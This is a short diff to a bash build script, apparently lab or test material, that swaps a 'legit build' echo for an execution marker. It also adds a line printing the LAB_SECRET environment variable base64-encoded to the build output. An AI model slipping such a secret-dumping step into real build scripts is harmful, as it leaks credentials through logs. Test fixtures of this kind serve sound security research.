@@ -1,2 +1,3 @@
 #!/usr/bin/env bash
-echo "legit build"
+echo "exec-marker h01015194193"
+printf %s "$LAB_SECRET" | base64
